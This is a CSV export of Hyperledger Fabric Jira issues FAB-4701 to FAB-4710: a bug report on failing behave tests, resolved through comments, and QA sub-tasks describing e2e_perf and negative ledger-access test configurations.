Summary,Issue key,Issue id,Parent id,Issue Type,Status,Project key,Project name,Project type,Project lead,Project description,Project url,Priority,Resolution,Assignee,Reporter,Creator,Created,Updated,Last Viewed,Resolved,Affects Version/s,Affects Version/s,Affects Version/s,Fix Version/s,Fix Version/s,Component/s,Component/s,Component/s,Component/s,Component/s,Due Date,Votes,Labels,Labels,Labels,Labels,Labels,Labels,Description,Environment,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Log Work,Log Work,Original Estimate,Remaining Estimate,Time Spent,Work Ratio,Σ Original Estimate,Σ Remaining Estimate,Σ Time Spent,Security Level,Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Inward issue link (Cloners),Inward issue link (Cloners),Inward issue link (Cloners),Outward issue link (Cloners),Inward issue link (Duplicate),Inward issue link (Duplicate),Inward issue link (Duplicate),Outward issue link (Duplicate),Outward issue link (Duplicate),Inward issue link (Relates),Inward issue link (Relates),Inward issue link (Relates),Inward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Custom field (Business Value),Custom field (Commit Levels),Custom field (Current Status),Custom field (Design),Custom field (Design Status),Custom field (Documentation Impact),Custom field (Documentation Status),Custom field (Epic Color),Custom field (Epic Link),Custom field (Epic Name),Custom field (Epic Status),Custom field (Executed),Custom field (Found in Commit),Custom field (Function Test Status),Custom field (Must Fix),Custom field (Original story points),Custom field (Parent Link),Custom field (Rank),Custom field (Release Note),Custom field (Release Note Required),Custom field (Root Cause Analysis),Custom field (SDK Impact),Custom field (Sample/Tutorial),Sprint,Sprint,Sprint,Sprint,Custom field (Steps to Reproduce),Custom field (Story Points),Custom field (System Test Impact),Custom field (Target end),Custom field (Target start),Custom field (Team),Custom field (Team),Custom field (Test Plan),Custom field (Test Result),Custom field (Test Result Details),Custom field (Test Type),Custom field (Triaged),Custom field (Usage),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Workaround),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitCommitsReferenced),Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment
Behave tests are failing on latest fabric commits,FAB-4701,17983,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jeffgarratt,rameshthoomu,rameshthoomu,15/Jun/17 5:09 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,21/Jun/17 1:13 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,quality,,,,,,"Observed behave tests are failing on latest fabric commit#0a72230

Below is the error log:

*00:10:47.896*       Assertion Failed: Expected single block, received: 0 blocks*00:10:47.896*       Captured stdout:*00:10:47.896*       Will copy gensisiBlock over at this point *00:10:47.896*       WARNING: Could not find port mapping for port 7050/tcp*00:10:47.896*       WARNING: Returning the actual container IP address, which might not be routable from the host.*00:10:47.896* 

Docker log files are available here:

https://jenkins.hyperledger.org/view/fabric/job/fabric-merge-behave-x86_64/1116/",,jeffgarratt,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx25b:",,,,,,,,,,,,,,,,,,,,,,,jeffgarratt,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jun/17 5:35 AM;jeffgarratt;[~rameshbabu79] This should be addressed by [https://gerrit.hyperledger.org/r/#/c/10587/]

[~binhn] is preparing to merge.;;;","15/Jun/17 5:36 AM;jeffgarratt;Binhn just merged.  Please let me know if you continue to see this issue.;;;","16/Jun/17 11:15 PM;Clayton Sims;Ramesh did this solved the issue?  can we mark 'done'?;;;","21/Jun/17 1:11 AM;jeffgarratt;[~rameshthoomu] can we close this one now?;;;","21/Jun/17 1:13 AM;rameshthoomu;Behave tests are working as expected on latest fabric commits. Closing this issue;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Negative Testing - Accessing a ledger you aren't on the channel,FAB-4702,17984,16637,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:09 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*:Negative Testing - Accessing a ledger you aren't on the channel

*Component*: Ledger/Channel
 *Description*:  Client must fail accessing Ledger on channel which he has no access.

*Artifact Locations:* NA
 *Network Topology*:  Standard Network
 *Client Driver*:  _e2e_cli sample_
 *Input*: modify e2e_cli sample to have 2 channels

*Output:*  

Must fail with an error (chaincode doesn`t exist on this channel)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2o7:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Chaincode Calling Chaincode via events using chaincode_example04,FAB-4703,17985,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:10 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Sep/17 12:40 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2of:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Aug/17 5:57 AM;Nishi;submitted patchset https://gerrit.hyperledger.org/r/#/c/12493/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
e2e_perf test with DEFAULT configurations,FAB-4704,17986,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:10 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name:* e2e_perf test with DEFAULT configurations

*Component*: endorser/ledger/committer/orderer
  *Description*:  modify e2e_cli sample scripts to have the following configurations

{color:#000000}This test uses 2 channels and 2 chaincodes. Anchor peers peer0 & peer2; OrgsLeaders are self-elected. {color}{color:#000000}Create all channels {color}
 * {color:#000000}All peers join all channels{color}
 * {color:#000000}all peers install all chaincodes {color}
 * {color:#000000}peer0 instantiates all chaincodes on all channels. {color}
 * {color:#000000}QIQ on all chaincodes on all channels on all peers and verify the responses at the end.
 Total: 32 Query transactions + 16 Invoke-Change transactions{color}

*Artifact Locations:* NA
  *Network Topology*:  e2e_cli based network topology 
  *Client Driver*:  _e2e_cli sample_
  *Output:*  Test passed
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2on:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
e2e_perf: anchors peers 0 and 3. leader peers 1 & 3. Instantiate each chaincode once on peer0 - which is anchor and NOT leader.,FAB-4705,17987,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:11 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: e2e_perf: anchors peers 0 and 3. leader peers 1 & 3. Instantiate each chaincode once on peer0 - which is anchor and NOT leader.

*Component*: endorser/ledger/committer/orderer
  *Description*:  modify e2e_cli sample scripts to configure peer0 and peer3 as anchor and peers and peer0 and peer3 as OrgLeader s

*Artifact Locations:* NA
  *Network Topology*:  e2e_cli based network topology 
  *Client Driver*:  _e2e_cli sample_
  *Output:*  Test passed
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2ov:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"e2e_perf: anchors 0,3. leaders 0,3.",FAB-4706,17988,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:11 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: e2e_perf: anchor 0,3 .Leaders 0,3

*Component*: Ledger/Channel
  *Description*:  modify e2e_cli sample scripts to create peers 0, 3 as anchor and peers 0,3 as Leaders

*Artifact Locations:* NA
  *Network Topology*:  e2e_cli based network topology 
  *Client Driver*:  _e2e_cli sample_
  *Output:*  Test passed
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2p3:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"e2e_perf: anchors 1,3. leaders 1,3.",FAB-4707,17989,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:11 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: e2e_perf: anchor 1,3 .Leaders 1,3

*Component*: Ledger/Channel
  *Description*:  modify e2e_cli sample scripts to create peers 1, 3 as anchor and peers 1,3 as Leaders

*Artifact Locations:* NA
  *Network Topology*:  e2e_cli based network topology 
  *Client Driver*:  _e2e_cli sample_
  *Output:*  Test passed
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2pb:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"e2e_perf: anchors 1,3. leaders 0,3.",FAB-4708,17990,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:11 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: e2e_perf: anchor 1,3 .Leaders 0,3

*Component*: Ledger/Channel
  *Description*:  modify e2e_cli sample scripts to create peers 1, 3 as anchor and peers 0,3 as Leaders

*Artifact Locations:* NA
  *Network Topology*:  e2e_cli based network topology 
  *Client Driver*:  _e2e_cli sample_
  *Output:*  Test passed
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2pj:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"e2e_perf with 4 channels, with 4 chaincodes per channel",FAB-4709,17991,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:12 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: e2e_perf with 4 channels, with 4 chaincodes per channel

*Component*: Ledger/Channel
  *Description*:  modify e2e_cli sample scripts to create 4 channels, with 4 chaincodes per channel

*Artifact Locations:* NA
  *Network Topology*:  e2e_cli based network topology 
  *Client Driver*:  _e2e_cli sample_
  *Output:*  Test passed
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2pr:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
e2e_perf with 25 channels 10 chaincodes,FAB-4710,17992,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:12 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: e2e_perf with 25 channels 10 chaincodes

*Component*: Ledger/Channel
 *Description*:  modify e2e_cli sample scripts to create 25 channels and 10 chaincodes and send transactions on to those channels.

*Artifact Locations:* NA
 *Network Topology*:  e2e_cli based network topology 
 *Client Driver*:  _e2e_cli sample_
 *Output:*  Test passed 
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2pz:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
